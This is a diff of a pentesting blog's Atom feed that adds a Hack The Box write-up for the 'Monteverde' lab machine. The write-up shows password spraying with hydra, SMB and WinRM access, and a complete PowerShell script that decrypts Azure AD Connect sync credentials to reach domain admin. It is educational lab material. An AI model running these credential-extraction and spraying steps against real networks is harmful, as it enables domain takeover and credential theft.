@@ -1,4 +1,303 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-06-09T08:50:07+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)</title><link href="http://localhost:4000/2022/05/13/Certifried.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)" /><published>2022-05-13T00:00:00+02:00</published><updated>2022-05-13T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/13/Certifried</id><content type="html" xml:base="http://localhost:4000/2022/05/13/Certifried.html"><![CDATA[<p><img src="/assets/Certifried/Certifried-diagram.jpg" alt="Certifried-diagram" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-06-24T21:16:23+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Medium] - Monteverde</title><link href="https://omnisl4sh.github.io/2022/06/24/Monteverde.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Monteverde" /><published>2022-06-24T00:00:00+02:00</published><updated>2022-06-24T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/06/24/Monteverde</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/06/24/Monteverde.html"><![CDATA[<p><img src="/assets/Monteverde/Monteverde.png" alt="Monteverde" /></p>
+
+<h3 id="summary">Summary</h3>
+<ul>
+  <li>Another Windows Domain Controller Machine.</li>
+  <li>We get a full list of domain users by enumerating <strong>RPC</strong> and are able to login with a user called <code class="language-plaintext highlighter-rouge">SABatchJobs</code> whose password was his own username.</li>
+  <li><em>Enumerating the</em> <strong>SMB</strong> <em>access for this user,</em> we find that he could read a certain <strong>XML</strong> file which contained a password.</li>
+  <li><em>After spraying the password over all users,</em> it turns out to belong to another user called <code class="language-plaintext highlighter-rouge">mhope</code> who happens to have <strong>PowerShell Remoting</strong> access and who’s a member of the <code class="language-plaintext highlighter-rouge">Azure Admins</code> AD group. Which was interesting.</li>
+  <li><em>Additionally,</em> we found a special folder called <code class="language-plaintext highlighter-rouge">.Azure</code> in <code class="language-plaintext highlighter-rouge">mhope</code>’s user profile. It contained remnants of a connection made to <strong>Azure</strong>.</li>
+  <li>We also find <code class="language-plaintext highlighter-rouge">Azure AD Connect</code> installed in the <code class="language-plaintext highlighter-rouge">C:\Program Files</code> directory which all stuck out and brought our attention to search for <strong>Privilege Escalation</strong> paths along that way.</li>
+  <li><em>Searching</em> <strong>Google</strong> <em>for</em> <code class="language-plaintext highlighter-rouge">Privilege Escalation Using Azure AD Connect</code>, we find a <strong>blog post</strong> that gives us a bit of background on what <code class="language-plaintext highlighter-rouge">Azure AD Connect</code> does and how to exploit it to gain <strong>Domain Admin</strong> privileges.</li>
+  <li><em>Since</em> <code class="language-plaintext highlighter-rouge">Azure AD Connect</code> <em>uses an account to sync passwords between the</em> <strong>On-prem Active Directory</strong> <em>and the</em> <strong>Azure Instance</strong>, this account must be granted <code class="language-plaintext highlighter-rouge">DCSync</code> rights for the functionality to work.</li>
+  <li>The credentials for this account are stored within the local <strong>MSSQL</strong> database that’s included in the installation of <code class="language-plaintext highlighter-rouge">Azure AD Connect</code>. <em>Even thought they are encrypted,</em> their decryption keys are also present on the same database.</li>
+  <li><em>Since our user</em> <code class="language-plaintext highlighter-rouge">mhope</code> <em>had access to that local DB,</em> We were able to extract and decrypt those credentials after doing a few tweaks to the <strong>PowerShell</strong> script provided by the blog author.</li>
+  <li>They turn out to be the <strong>Domain Administrator</strong>’s creds and we root the box.</li>
+</ul>
+
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<p>No special scan here. Just the standard <code class="language-plaintext highlighter-rouge">nmap</code> with <code class="language-plaintext highlighter-rouge">-sC</code> for default scripts and <code class="language-plaintext highlighter-rouge">-sV</code> for version detection on all ports.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-23 17:15:53Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-server-header: Microsoft-HTTPAPI/2.0
+| http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+49747/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-06-23T17:16:47
+|_  start_date: N/A
+</code></pre></div></div>
+
+<p>We notice it’s a <strong>Windows</strong> box with few ports indicative of a <strong>Domain Controller</strong>: <strong>DNS</strong> on tcp 53, <strong>Kerberos</strong> on tcp 88 and <strong>LDAP</strong> on tcp 389.</p>
+
+<p>The domain name is <strong>MEGABANK.LOCAL</strong> and the hostname is <strong>MONTEVERDE</strong></p>
+
+<p>We also have <strong>WinRM</strong> open on tcp 5985 which would be handy to get remote code execution for any user present in either <strong>Administrators</strong> or <strong>Remote Management Users</strong> local groups.</p>
+
+<h3 id="username-enumeration">Username Enumeration</h3>
+<p><em>Using a tool called</em> <code class="language-plaintext highlighter-rouge">enum4linux-ng</code>, we are able to get a list of usernames via <code class="language-plaintext highlighter-rouge">RPC</code>:</p>
+
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">enum4linx-ng -A 10.10.10.172</code></p>
+
+<p><img src="/assets/Monteverde/enum4linux-ng-output.jpg" alt="enum4linux-ng-output" /></p>
+
+<p>No interesting info was in the description except for one user: <code class="language-plaintext highlighter-rouge">AAD_987d7f2f57d2</code></p>
+
+<p>It said: <code class="language-plaintext highlighter-rouge">Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.</code></p>
+
+<p>This hinted at the possibility that this account might have <strong>DCSync</strong> rights. <em>If that was true,</em> then getting access as that user would mean game over :D</p>
+
+<p>We take note of that and get the <strong>Domain Password Policy</strong> from the output as well.</p>
+
+<p><img src="/assets/Monteverde/password-policy.jpg" alt="password-policy" /></p>
+
+<p><em>With no account lockout configured,</em> we can spray like there’s no tomorrow :D</p>
+
+<h3 id="asreproasting-then-password-spraying">ASREPRoasting then Password Spraying</h3>
+<p><em>Since</em> <strong>ASREPRoasting</strong> <em>is the first thing to do with a userlist,</em> we tried it but weren’t awarded with any hashes. So we turned to <strong>Password Spraying</strong>.</p>
+
+<p>We make a quick list of common passwords to try like ‘P@ssw0rd’, ‘Welcome1’ etc. but don’t get anything :/</p>
+
+<p>So we try using the usernames themselves as passwords. We do so using <code class="language-plaintext highlighter-rouge">hydra</code> and we get a hit!</p>
+
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">hydra -e s -L users.txt ldap3://10.10.10.172 -v</code></p>
+
+<p>where the <code class="language-plaintext highlighter-rouge">-e</code> flag with the <code class="language-plaintext highlighter-rouge">s</code> argument is the part instructing <code class="language-plaintext highlighter-rouge">hydra</code> to use the same entry for both username and password.</p>
+
+<p><img src="/assets/Monteverde/hydra-attack.jpg" alt="hydra-attack" /></p>
+
+<h3 id="smb-access">SMB Access</h3>
+<p>After we verify that <code class="language-plaintext highlighter-rouge">SABatchJobs</code> doesn’t have <strong>WinRM</strong> access, we enumerate <strong>SMB</strong> as him using <code class="language-plaintext highlighter-rouge">crackmapexec</code>’s <code class="language-plaintext highlighter-rouge">spider_plus</code> module.</p>
+
+<p>This module does as the name suggests: it <em>recursively</em> spiders <strong>SMB</strong> shares and outputs the results in a temp folder.</p>
+
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">crackmapexec smb 10.10.10.172 -u SABatchJobs -p SABatchJobs -M spider_plus</code></p>
+
+<p><img src="/assets/Monteverde/cme-spiderplus.jpg" alt="cme-spiderplus" /></p>
+
+<p><em>Looking at the results in the output</em> <strong>JSON</strong> <em>file,</em> we notice a very interesting file: <code class="language-plaintext highlighter-rouge">azure.xml</code> which existed in the <code class="language-plaintext highlighter-rouge">users</code> share under the folder for the <code class="language-plaintext highlighter-rouge">mhope</code> user:</p>
+
+<p><img src="/assets/Monteverde/azure-xml-file.jpg" alt="azure-xml-file" /></p>
+
+<p>We connect to the share with <code class="language-plaintext highlighter-rouge">smbclient</code> and download the file to view its contents:</p>
+
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">smbclient //10.10.10.172/users$ -U SABatchJobs</code></p>
+
+<p>and we get a password!</p>
+
+<p><img src="/assets/Monteverde/mhope-password.jpg" alt="mhope-password" /></p>
+
+<h3 id="shell-access-as-mhope">Shell Access as <code class="language-plaintext highlighter-rouge">mhope</code></h3>
+<p><em>After getting this password,</em> we immediately spray it over the domain users. We find that it’s valid and that we have <strong>WinRM</strong> access as well!</p>
+
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">crackmapexec winrm 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success</code></p>
+
+<p><strong>Note:</strong> we used the <code class="language-plaintext highlighter-rouge">--continue-on-success</code> to be able to take advantage of any password reuse.</p>
+
+<p><img src="/assets/Monteverde/winrm-as-mhope.jpg" alt="winrm-as-mhope" /></p>
+
+<p>We login using <code class="language-plaintext highlighter-rouge">evil-winrm</code> to get a <strong>PowerShell</strong> session on the box:</p>
+
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'</code></p>
+
+<p><img src="/assets/Monteverde/evil-winrm-access.jpg" alt="evil-winrm-access" /></p>
+
+<h3 id="enumeration-before-privesc">Enumeration before Privesc</h3>
+<p>Running a quick <code class="language-plaintext highlighter-rouge">whoami /groups</code> command shows that we are in an AD group called <code class="language-plaintext highlighter-rouge">Azure Admins</code></p>
+
+<p><img src="/assets/Monteverde/ad-group-membership.jpg" alt="ad-group-membership" /></p>
+
+<p>We also notice a strange folder on <code class="language-plaintext highlighter-rouge">mhope</code>’s user profile.</p>
+
+<p><img src="/assets/Monteverde/dot-azure-folder.jpg" alt="dot-azure-folder" /></p>
+
+<p>And in the <code class="language-plaintext highlighter-rouge">c:\Program Files</code> directory, we find a whole bunch of software relevant to <strong>Azure AD Sync</strong></p>
+
+<p><img src="/assets/Monteverde/program-files.jpg" alt="program-files" /></p>
+
+<p><em>Right now,</em> our senses are <em>tingling</em>. <em>Because,</em> we had a lot of signs along the way that are pointing towards this area:</p>
+<ol>
+  <li>the <code class="language-plaintext highlighter-rouge">AAD_987d7f2f57d2</code> user</li>
+  <li>the <code class="language-plaintext highlighter-rouge">azure.xml</code> file</li>
+  <li>the <code class="language-plaintext highlighter-rouge">Azure Admins</code> group membership</li>
+  <li>the <code class="language-plaintext highlighter-rouge">.Azure</code> folder</li>
+  <li>the Azure related software in <code class="language-plaintext highlighter-rouge">Program Files</code></li>
+</ol>
+
+<p>So we go ahead and do some googling :D</p>
+
+<h3 id="research">Research</h3>
+<p>We decide to use a broad term in our first search to make things easier for ourselves. We type in: “Azure AD Sync Privilege Escalation”</p>
+
+<p>and we get this awesome blog post <a href="/assets/Monteverde/https://blog.xpnsec.com/azuread-connect-for-redteam/">here</a>:</p>
+
+<p><img src="/assets/Monteverde/privesc-blog.jpg" alt="privesc-blog" /></p>
+
+<p><em>Reading the post,</em> we learn that <strong>Azure AD Connect</strong> is: a tool for <em>integrating between</em> both <strong>On-Prem Active Directory Deployments</strong> and <strong>Azure AD</strong>.</p>
+
+<p>It has the <strong>Password Hash Syncronization (PHS)</strong> feature which “<em>uploads user accounts and password hashes from Active Directory to Azure</em>”.</p>
+
+<p>We also learn that: <em>during the setup,</em> an <strong>AD account</strong> is used to perform the sync process. And is granted the <strong>necessary permissions</strong> to be able to access all the <strong>domain hashes</strong>.</p>
+
+<p>One more thing we notice: is that the credentials for the synchronization account are <strong>found on the local database</strong> included in the installation process.</p>
+
+<p><em>And, even though they are encrypted,</em> the key to <strong>decrypt</strong> them is also present on the same database.</p>
+
+<h3 id="trying-the-powershell-script">Trying the PowerShell Script</h3>
+<p>The researcher and blog author <strong>“Adam Chester”</strong> had thankfully created a script that takes care of all the above and dumps us the stored credentials <em>if we had access to the database.</em></p>
+
+<p>We’re going to use a brief command to try connecting to the local database to see if we can query it: <code class="language-plaintext highlighter-rouge">sqlcmd -Q "SELECT name FROM master.dbo.sysdatabases"</code></p>
+
+<p>Seems like we do!</p>
+
+<p><img src="/assets/Monteverde/database-access.jpg" alt="database-access" /></p>
+
+<p><em>After using the script,</em> we notice that it runs. But it stops right after it prints its banner and we lose our shell.</p>
+
+<p><img src="/assets/Monteverde/script-fail.jpg" alt="script-fail" /></p>
+
+<h3 id="troubleshooting">Troubleshooting</h3>
+<p><em>Since the script isn’t big (&lt; 40 lines)</em>, It wouldn’t be difficult to step through it line-by-line to find out what’s wrong.</p>
+
+<p>we take a look at the first 5 lines:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
+
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
+$client.Open()
+$cmd = $client.CreateCommand()
+
+</code></pre></div></div>
+
+<p>And start by running the part which defines how the script will connect to the database a.k.a the <strong>“connection string”</strong>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"</code></p>
+
+<p>which runs okay. Because we’re not really taking any action here. Just initializing an object of the type “System.Data.SqlClient.SqlConnection”. Nothing more.</p>
+
+<p>We get the error on the <code class="language-plaintext highlighter-rouge">$client.Open()</code> part though:</p>
+
+<p><img src="/assets/Monteverde/sql-error.jpg" alt="sql-error" /></p>
+
+<p>Reading the sentences in the error tells us something about <strong>network-related</strong> errors and trying to reach the <strong>SQL server</strong> <em>remotely</em>.</p>
+
+<p>we confirm this by consulting the <strong>Microsoft Documentation</strong> on connection strings <a href="/assets/Monteverde/https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection.connectionstring?view=dotnet-plat-ext-6.0#system-data-sqlclient-sqlconnection-connectionstring">here</a>.</p>
+
+<p>it says the <strong>“Data Source”</strong> is for the <strong>“The name or network address of the instance of SQL Server to which to connect.”</strong>.</p>
+
+<p><img src="/assets/Monteverde/Data-Source-Doc.jpg" alt="Data-Source-Doc" /></p>
+
+<p>so we change it up and just use <code class="language-plaintext highlighter-rouge">localhost</code> instead. But, we get a different error this time:</p>
+
+<p><img src="/assets/Monteverde/sql-login-error.jpg" alt="sql-login-error" /></p>
+
+<p>Seems that the connection string doesn’t use our <code class="language-plaintext highlighter-rouge">mhope</code> user credentials.</p>
+
+<p><em>Looking again at the</em> <strong>Microsoft Documentation,</strong> we find info related to authentication:</p>
+
+<p><img src="/assets/Monteverde/sql-auth.jpg" alt="sql-auth" /></p>
+
+<p><em>After modyfing the connection string,</em> we get no errors when opening the connection. Seems promising! :)</p>
+
+<p><img src="/assets/Monteverde/correct-conn-string.jpg" alt="correct-conn-string" /></p>
+
+<h3 id="enough-troubleshooting-let-me-some-creds">Enough Troubleshooting. Let me some creds!</h3>
+<p><em>After modifying the connection string,</em> let’s go over what the script does in brief:</p>
+
+<ol>
+  <li>Defining the connection string: we’re connecting to the <strong>ADSync DB</strong> on the <strong>local computer</strong> using <strong>Windows Authentication</strong></li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$connection_string = "Data Source=localhost;Initial Catalog=ADSync;Integrated Security=true;"
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList $connection_string
+$client.Open()
+$cmd = $client.CreateCommand()
+</code></pre></div></div>
+
+<ol>
+  <li>Querying for the important bits to do the decryption: <code class="language-plaintext highlighter-rouge">keyset_id</code>, <code class="language-plaintext highlighter-rouge">instance_id</code> and <code class="language-plaintext highlighter-rouge">entropy</code> from the <code class="language-plaintext highlighter-rouge">mms_server_configuration</code> table</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+</code></pre></div></div>
+
+<ol>
+  <li>Obtaining the configuration items: <code class="language-plaintext highlighter-rouge">private_configuration_xml</code> and <code class="language-plaintext highlighter-rouge">encrypted_configuration</code> from the <code class="language-plaintext highlighter-rouge">mms_management_agent</code> table</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
+</code></pre></div></div>
+
+<ol>
+  <li>Loading the <code class="language-plaintext highlighter-rouge">mcrypt.dll</code> into memory and carrying out the decryption using the keys extracted from <strong>Step #1</strong></li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+</code></pre></div></div>
+
+<ol>
+  <li>Selecting the domain, username and password from the XML-formatted output and printing them to the screen.</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$domain   = select-xml -Content $config    -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config    -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+
+Write-Host ("Domain: "   + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+</code></pre></div></div>
+
+<p><em>With everything in place,</em> we run the script and get a clean set of creds ;]</p>
+
+<p><img src="/assets/Monteverde/domain-admin-creds.jpg" alt="domain-admin-creds" /></p>
+
+<p>The creds are good and the box is <strong>owned</strong> :D</p>
+
+<p><img src="/assets/Monteverde/rooted.jpg" alt="rooted" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)</title><link href="https://omnisl4sh.github.io/2022/05/13/Certifried.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)" /><published>2022-05-13T00:00:00+02:00</published><updated>2022-05-13T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/13/Certifried</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/13/Certifried.html"><![CDATA[<p><img src="/assets/Certifried/Certifried-diagram.jpg" alt="Certifried-diagram" /></p>
 
 <h1 id="the-attack-in-brief">The Attack In Brief</h1>
 <ol>
@@ -83,7 +382,7 @@
   <li><strong>Will Schroeder</strong> and <strong>Lee Christensen</strong> who wrote the paper that started it all <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">here</a></li>
   <li><a href="https://twitter.com/ly4k_">Oliver Lyak</a> who discovered, reported and explained the vulnerability <a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">here</a> as well as created the <code class="language-plaintext highlighter-rouge">Certipy</code> tool.</li>
   <li><strong>SecureAuthCorp</strong> for the awesome <strong>Impacket</strong> scripts of course :D</li>
-</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)</title><link href="http://localhost:4000/2022/05/07/Cascade.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)" /><published>2022-05-07T00:00:00+02:00</published><updated>2022-05-07T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/07/Cascade</id><content type="html" xml:base="http://localhost:4000/2022/05/07/Cascade.html"><![CDATA[<p><img src="/assets/Cascade/Cascade.png" alt="Cascade" /></p>
+</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)</title><link href="https://omnisl4sh.github.io/2022/05/07/Cascade.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)" /><published>2022-05-07T00:00:00+02:00</published><updated>2022-05-07T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/07/Cascade</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/07/Cascade.html"><![CDATA[<p><img src="/assets/Cascade/Cascade.png" alt="Cascade" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -449,7 +748,7 @@ Host script results:
 
 <p><img src="/assets/Cascade/got-admin-at-last.jpg" alt="got-admin-at-last" /></p>
 
-<p>And we finally own the box after following all those breadcrumbs XD</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)</title><link href="http://localhost:4000/2022/05/06/Mantis.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)" /><published>2022-05-06T00:00:00+02:00</published><updated>2022-05-06T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/06/Mantis</id><content type="html" xml:base="http://localhost:4000/2022/05/06/Mantis.html"><![CDATA[<p><img src="/assets/Mantis/Mantis.png" alt="Mantis" /></p>
+<p>And we finally own the box after following all those breadcrumbs XD</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)</title><link href="https://omnisl4sh.github.io/2022/05/06/Mantis.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)" /><published>2022-05-06T00:00:00+02:00</published><updated>2022-05-06T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/06/Mantis</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/06/Mantis.html"><![CDATA[<p><img src="/assets/Mantis/Mantis.png" alt="Mantis" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -796,7 +1095,7 @@ Host script results:
 
 <p><img src="/assets/Mantis/pykek-for-the-win.jpg" alt="pykek-for-the-win" /></p>
 
-<p>Sweeeet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)</title><link href="http://localhost:4000/2022/05/02/Sizzle.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)" /><published>2022-05-02T00:00:00+02:00</published><updated>2022-05-02T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/02/Sizzle</id><content type="html" xml:base="http://localhost:4000/2022/05/02/Sizzle.html"><![CDATA[<p><img src="/assets/Sizzle/Sizzle.png" alt="Sizzle" /></p>
+<p>Sweeeet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)</title><link href="https://omnisl4sh.github.io/2022/05/02/Sizzle.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)" /><published>2022-05-02T00:00:00+02:00</published><updated>2022-05-02T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/02/Sizzle</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/02/Sizzle.html"><![CDATA[<p><img src="/assets/Sizzle/Sizzle.png" alt="Sizzle" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -1169,7 +1468,7 @@ Command=ToggleDesktop
 
 <p>OR…</p>
 
-<p><img src="/assets/Sizzle/zero-logon-XD.jpg" alt="zero-logon-XD" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)</title><link href="http://localhost:4000/2022/04/30/Reel.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)" /><published>2022-04-30T00:00:00+02:00</published><updated>2022-04-30T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/30/Reel</id><content type="html" xml:base="http://localhost:4000/2022/04/30/Reel.html"><![CDATA[<p><img src="/assets/Reel/Reel.png" alt="Reel" /></p>
+<p><img src="/assets/Sizzle/zero-logon-XD.jpg" alt="zero-logon-XD" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)</title><link href="https://omnisl4sh.github.io/2022/04/30/Reel.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Reel (AD Pentesting Track #6)" /><published>2022-04-30T00:00:00+02:00</published><updated>2022-04-30T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/30/Reel</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/30/Reel.html"><![CDATA[<p><img src="/assets/Reel/Reel.png" alt="Reel" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -1544,7 +1843,7 @@ $ErrorActionPreference = 'continue'
 
 <p><img src="/assets/Reel/print-ops-and-load-driver.jpg" alt="print-ops-and-load-driver" /></p>
 
-<p><em>However,</em> exploiting this would be challenging to achieve specially with the <strong>Group Policy</strong> restrictions in place.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - PetitPotam</title><link href="http://localhost:4000/2022/04/28/PetitPotam.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - PetitPotam" /><published>2022-04-28T00:00:00+02:00</published><updated>2022-04-28T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/28/PetitPotam</id><content type="html" xml:base="http://localhost:4000/2022/04/28/PetitPotam.html"><![CDATA[<h1 id="introduction--attack-anatomy">Introduction &amp; Attack Anatomy</h1>
+<p><em>However,</em> exploiting this would be challenging to achieve specially with the <strong>Group Policy</strong> restrictions in place.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">AD Pentesting | Domain Privesc - PetitPotam</title><link href="https://omnisl4sh.github.io/2022/04/28/PetitPotam.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - PetitPotam" /><published>2022-04-28T00:00:00+02:00</published><updated>2022-04-28T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/28/PetitPotam</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/28/PetitPotam.html"><![CDATA[<h1 id="introduction--attack-anatomy">Introduction &amp; Attack Anatomy</h1>
 
 <p><img src="/assets/petitpotam/Petit-Potam-Flow-Diagram.jpg" alt="Petit-Potam-Flow-Diagram" /></p>
 
@@ -1693,7 +1992,7 @@ Luckily enough, with some simple mitigation steps, this can be resolved.</p>
   <li><strong>GhostPack</strong> for the <strong>Rubeus</strong> tool</li>
   <li><strong>Harshit Rajpal</strong> for the amazing article explaining the attack (https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/)</li>
